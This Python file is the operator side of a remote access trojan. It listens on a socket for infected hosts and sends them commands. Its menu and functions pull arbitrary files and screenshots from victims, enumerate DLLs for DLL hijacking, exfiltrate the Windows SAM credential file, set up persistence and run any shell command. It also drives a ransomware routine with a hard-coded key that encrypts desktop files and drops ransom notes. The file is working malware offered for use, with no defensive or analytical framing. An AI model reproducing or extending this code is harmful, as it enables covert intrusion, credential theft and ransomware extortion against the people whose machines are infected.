import os, socket, threading, termcolor, time, datetime



def dll_enum(target, ip, command):
    download_file(target, ip, command)
    with open(r'C:\Users\aaa\Desktop\{}\dllANDpaths.txt'.format(ip[0]),'r+' ) as f:
        dllANDpaths_temp = f.readlines()
        for i in dllANDpaths_temp:
            dllANDpaths_str = i.replace("#", "\n")
            dllANDpaths_list = dllANDpaths_str.split("\n")
        used_dlls_list = dllANDpaths_list[0]
        used_dlls_list = used_dlls_list.split(',')
        with open(r'C:\Users\aaa\Desktop\{}\Dlls_and_paths.txt'.format(ip[0]),'w+') as ff:
            ff.write("{} \n {}".format(used_dlls_list, "_" * 10 * len(used_dlls_list)))
            for dll in used_dlls_list:
                ff.write("\n \n{}".format(dll))
                for line in dllANDpaths_list[2:]:
                    try:
                        if dll in line.split("&&")[1] and len(dll) > 3:
                            ff.write("\n{}\{}".format(line.split("&&")[0].strip(), dll))
                    except:
                        pass
    os.remove(r'C:\Users\aaa\Desktop\{}\dllANDpaths.txt'.format(ip[0]))



def get_current_DateTime():
    now = datetime.datetime.now()
    DateTime = "{}".format(now.strftime("%Y-%m-%d %H;%M"))
    print(DateTime)
    return DateTime



def recv_command_output(target, command, timeout=2):
    if command == "dll_enum":
        timeout = 4500
    target.setblocking(0)
    total_data = b''
    data = ''
    begin_time = time.time()

    while True:
        if total_data and time.time()-begin_time > 4:
            break

        elif time.time()-begin_time > timeout*20:
            break

        else:
            try:
                data = target.recv(8192)
                if data:
                    total_data += data
                    begin_time = time.time()
                else:
                    time.sleep(0.1)
            except:
                pass
    return total_data



def download_file(target, ip, command):
    if command.strip() == "download_file":
        file_path = input("full path of file we want:  ")
        target.send(file_path.encode())
        file_name = input("Save file as:  ")

    elif command.lower() == "screenshot":
        file_name = "{} .png".format(get_current_DateTime())

    elif command.lower() == "dll_enum":
        file_name = r'dllANDpaths.txt'

    elif command.lower() == 'ransom':
        file_name = "Ransomware_key  {}.txt".format(get_current_DateTime())

    elif command.lower() == 'sam':
        file_name = 'SAM'


    with open(r"C:\Users\aaa\Desktop\{}\{}".format(ip[0], file_name), 'wb') as f:
        file_binary = recv_command_output(target, command)
        f.write(file_binary)
    print("file downloaded")



def upload_file(target, ip, command):
    remote_path = input("Full path of where to save the file on the client:  ")
    target.send(remote_path.encode())

    local_path = input("full path of file we want to upload:  ")
    with open(local_path, 'rb') as f:
        file_binary = f.read()

    time.sleep(4)
    target.send(file_binary)

    was_it_uploaded = recv_command_output(target, command)
    print(was_it_uploaded.decode())


def menu():
    output = """
    [+] help - View the menu.
    [+] download_file  - To get a file from the target
    [+] upload_file - Send a file to the target
    [+] screenshot - Get a screenshot from the target. File name will be the exact time of hte screenshot.
    [+] dll_enum - Get the location of all the DLL's that the injected process uses. This must be used for DLL hijacking.
    [+] ransom - Make the injected process encrypt, decrypt & leave ransom notes the target. 
    [+] sam - Get the SAM file of the infected host. The injected process must have elevated privileges.
    [+] persistence - Take persistence on the system.
    [+] type any system command - You can run any system command.
    """
    print(output)


def ransom(target, ip, command):
    target.send('KFf8-yqqzBt6V07EecJ9mmVm8547wYDWUCtk9REC-Dg='.encode())
    command = input("Choose and write one of the following:  \n1 - Encrypt files from desktop and below\n2 - Decrypt all the encrypted files. \n3\other - will drop README on desktop\nAction number:")
    if command.strip() == '1':
        target.send('encrypt'.encode())
    elif command.strip() == '2':
        target.send('decrypt'.encode())
    else:
        target.send('readme'.encode())

    response = recv_command_output(target, command)
    print(response.decode().replace('&', '\n'))


def start_communication(target,ip):
    while True:
        command = input("type a CLI command or built-in coammand :  ").strip()
        if command.lower() == "help":
            menu()
            continue
        target.send(command.encode())
        if command.lower().strip() == 'download_file':
            download_file(target, ip, command)
        elif command.lower() == "screenshot":
            download_file(target, ip, command)
        elif command.lower() == "dll_enum":
            dll_enum(target, ip, command)
        elif command.lower().strip() == 'upload_file':
            upload_file(target, ip, command)
        elif command.lower() == "ransom":
            ransom(target, ip, command)
        elif command.lower() == "sam":
            download_file(target, ip, command)
        elif len(command) <= 1:
            continue
        else:
            print(recv_command_output(target, command).decode())



def accept_connection():
    target, ip = s.accept()
    try:
        os.mkdir(r"C:\Users\aaa\Desktop\{}".format(ip[0]))
    except Exception as e:
        print("Cant create a folder for {} :  \n  {}".format(ip, e))
    print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))
    start_communication(target, ip)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('192.168.1.101', 5555))
print(termcolor.colored('[+] Listening For the incoming Conections', 'green'))
s.listen(5)
t1 = threading.Thread(target=accept_connection)
t1.start()

